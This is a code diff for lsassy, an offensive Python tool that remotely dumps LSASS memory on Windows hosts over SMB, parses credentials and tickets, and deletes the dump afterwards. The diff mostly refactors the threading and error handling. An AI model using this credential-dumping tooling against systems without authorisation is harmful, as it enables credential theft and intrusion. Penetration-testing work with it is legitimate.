@@ -1,8 +1,8 @@
 import logging
+import signal
 
 import threading
-import ctypes
-import time
+from queue import Queue
 from lsassy import logger
 from lsassy.utils import get_targets
 from lsassy.parser import Parser
@@ -14,16 +14,47 @@ from lsassy.impacketfile import ImpacketFile
 lock = threading.RLock()
 
 
-class Lsassy:
+class Worker(threading.Thread):
+    def __init__(self, task_q):
+        super().__init__()
+        self.task_q = task_q
+        self.shutdown_flag = threading.Event()
+
+    def run(self):
+        while not self.shutdown_flag.is_set():
+            worker_lsassy = self.task_q.get()
+            self.name = worker_lsassy.target
+            worker_lsassy.run()
+            self.task_q.task_done()
+
+
+class ThreadPool:
     def __init__(self, targets, arguments):
         self.targets = get_targets(targets)
         self.arguments = arguments
         self.threads = []
         self.max_threads = arguments.threads
+        self.task_q = Queue(self.max_threads+10)
+        signal.signal(signal.SIGINT, self.interrupt_event)
+        signal.signal(signal.SIGTERM, self.interrupt_event)
+
+    def interrupt_event(self, signum, stack):
+        self.stop()
+        raise KeyboardInterrupt
+
+    def stop(self):
+        logging.error("**CTRL+C** QUITTING GRACEFULLY")
+        for thread in self.threads:
+            thread.shutdown_flag.set()
+        for thread in self.threads:
+            thread.join()
+
+    def isRunning(self):
+        return any(thread.is_alive() for thread in self.threads)
 
     def run(self):
         logger.init()
-        threading.current_thread().name = "LSASSY CORE"
+        threading.current_thread().name = "[Core]"
 
         if self.arguments.v == 1:
             logging.getLogger().setLevel(logging.INFO)
@@ -31,66 +62,33 @@ class Lsassy:
             logging.getLogger().setLevel(logging.DEBUG)
         else:
             logging.getLogger().setLevel(logging.ERROR)
+        try:
+            # Turn-on the worker threads
+            for i in range(self.max_threads):
+                thread = Worker(self.task_q)
+                self.threads.append(thread)
+                thread.start()
 
-        started = False
-        quitting = False
-        thread_id = 0
-        total_threads = len(self.targets)
-        if self.max_threads < 1:
-            logging.error("How do you expect for this to work with {} threads?".format(self.max_threads))
-            return False
-        elif self.max_threads > 256:
-            self.max_threads = 256
-            logging.info("Max threads has been reduced to 256 as python doesn't allow for more than 256 opened files")
-        while not started or self.has_live_threads() or (not quitting and thread_id < total_threads):
-            try:
-                if not quitting and thread_id < total_threads:
-                    current_target = self.targets[thread_id]
-                    counter = sum(1 for t in self.threads if t.is_alive())
-                    if counter < self.max_threads:
-                        thread = TLsassy(current_target, self.arguments, thread_id+1, total_threads)
-                        thread.start()
-                        started = True
-                        self.threads.append(thread)
-                        thread_id += 1
-                    else:
-                        time.sleep(1)
-                else:
-                    [t.join(1) for t in self.threads if t is not None and t.is_alive()]
-            except KeyboardInterrupt:
-                # Ctrl-C handling and send kill to threads
-                print()
-                logging.error("Quitting gracefully...")
-                quitting = True
-                for t in self.threads:
-                    t.raise_exception(KeyboardInterrupt)
+            instance_id = 1
+            for target in self.targets:
+                self.task_q.put(Lsassy(target, self.arguments, instance_id))
+                instance_id += 1
 
-    def has_live_threads(self):
-        return True in [t.is_alive() for t in self.threads]
+            # Block until all tasks are done
+            self.task_q.join()
+        except KeyboardInterrupt as e:
+            logging.error("Quitting.")
 
 
-class TLsassy(threading.Thread):
+class Lsassy:
     """
     Main class to extract credentials from one remote host. Can be used in different threads for parallelization
     """
 
-    def __init__(self, target_name, arguments, thread_id=1, targets_count=1):
+    def __init__(self, target_name, arguments, thread_id=1):
         self.target = target_name
         self.args = arguments
-        if targets_count > 1:
-            thread_name = "[{}/{}] {}".format(thread_id, targets_count, self.target)
-        else:
-            thread_name = self.target
-        super().__init__(name=thread_name)
-
-    def raise_exception(self, exception):
-        t_id = 0
-        if hasattr(self, '_thread_id'):
-            return self._thread_id
-        for id, thread in threading._active.items():
-            if thread is self:
-                t_id = id
-        ctypes.pythonapi.PyThreadState_SetAsyncExc(ctypes.c_long(t_id), ctypes.py_object(exception))
+        self.thread_id = thread_id
 
     def run(self):
         """
@@ -122,7 +120,7 @@ class TLsassy(threading.Thread):
             if len(dump_path) > 1 and dump_path[1] == ":":
                 if dump_path[0] != "C":
                     logging.error("Drive '{}' is not supported. 'C' drive only.".format(dump_path[0]))
-                    exit(1)
+                    return False
                 dump_path = dump_path[2:]
             if dump_path[-1] != "\\":
                 dump_path += "\\"
@@ -132,7 +130,7 @@ class TLsassy(threading.Thread):
 
         if parse_only and (dump_path is None or self.args.dump_name is None):
             logging.error("--dump-path and --dump-name required for --parse-only option")
-            exit(1)
+            return False
 
         try:
             session = Session()
@@ -153,20 +151,20 @@ class TLsassy(threading.Thread):
 
             if session.smb_session is None:
                 logging.error("Couldn't connect to remote host")
-                exit(1)
+                return False
 
             if not parse_only:
                 dumper = Dumper(session, self.args.timeout).load(self.args.dump_method)
                 if dumper is None:
                     logging.error("Unable to load dump module")
-                    exit(1)
+                    return False
 
                 file = dumper.dump(no_powershell=self.args.no_powershell, exec_methods=exec_methods,
                                    dump_path=dump_path,
                                    dump_name=self.args.dump_name, timeout=self.args.timeout, **options)
                 if file is None:
                     logging.error("Unable to dump lsass.")
-                    exit(1)
+                    return False
             else:
                 file = ImpacketFile(session).open(
                     share="C$",
@@ -176,7 +174,7 @@ class TLsassy(threading.Thread):
                 )
                 if file is None:
                     logging.error("Unable to open lsass dump.")
-                    exit(1)
+                    return False
 
             credentials, tickets = Parser(file).parse()
             file.close()
@@ -189,7 +187,7 @@ class TLsassy(threading.Thread):
 
             if credentials is None:
                 logging.error("Unable to extract credentials from lsass. Cleaning.")
-                exit(1)
+                return False
 
             with lock:
                 Writer(credentials, tickets).write(
@@ -224,12 +222,12 @@ class TLsassy(threading.Thread):
             if not parse_only:
                 try:
                     if ImpacketFile.delete(session, file_path=file.get_file_path(), timeout=self.args.timeout):
-                        logging.success("Lsass dump successfully deleted")
+                        logging.debug("Lsass dump successfully deleted")
                 except Exception as e:
                     try:
                         logging.debug("Couldn't delete lsass dump using file. Trying dump object...")
                         if ImpacketFile.delete(session, file_path=dumper.dump_path + dumper.dump_name, timeout=self.args.timeout):
-                            logging.success("Lsass dump successfully deleted")
+                            logging.debug("Lsass dump successfully deleted")
                     except Exception as e:
                         logging.debug("Potential issue while deleting lsass dump: {}".format(str(e)))
 
